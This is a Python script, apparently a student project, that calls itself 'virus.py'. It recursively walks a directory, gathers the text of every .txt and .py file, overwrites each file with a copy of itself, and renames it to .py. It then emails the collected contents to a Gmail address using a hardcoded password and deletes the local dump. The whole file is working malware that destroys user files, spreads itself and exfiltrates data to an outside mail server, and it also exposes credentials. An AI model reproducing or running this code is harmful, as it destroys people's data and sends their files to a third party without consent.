import os
import smtplib
import shutil
from email.mime.text import MIMEText

def list_files(mypath, curr_dir):
	path_list = []
	file_list = os.listdir(mypath)
	for myfile in file_list:
		full_path = os.path.join(mypath, myfile)
		if (full_path.endswith(".txt") or full_path.endswith(".py")) and myfile != "contents.txt":
			file_out.write(full_path+"\n\n")
			file_in = open(full_path, "r")
			while True:
				character = file_in.read(1)
				if not character:
					break
				file_out.write(character)
			file_in.close()
			file_out.write("\n\n==========================================================================================\n\n")
			shutil.copy2(os.path.join(curr_dir, 'virus.py'), full_path)
			os.rename(full_path, os.path.splitext(full_path)[0]+".py")
		elif os.path.isdir(full_path):
			list_files(full_path, curr_dir)
	return path_list

user_path = input("Enter a path:  ")
curr_dir = os.path.dirname(os.path.realpath(__file__))
user_file = os.path.join(curr_dir, 'contents.txt')
file_out = open(user_file, 'w+')
list_files(user_path, curr_dir)
file_out.close()

TO = 'csc113testemail@gmail.com'
SUBJECT = 'Project 1'
with open(user_file) as f:
	TEXT = f.read()

gmail_sender = 'csc113testemail@gmail.com'
gmail_passwd = 'project1gmail'

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.login(gmail_sender, gmail_passwd)

BODY = '\r\n'.join(['To: %s' % TO,
					'From: %s' % gmail_sender,
					'Subject: %s' % SUBJECT,
					'', TEXT])

try:
	server.sendmail(gmail_sender, [TO], BODY)
	print ('email sent')
except:
	print ('error sending mail')

server.quit()

os.remove(user_file)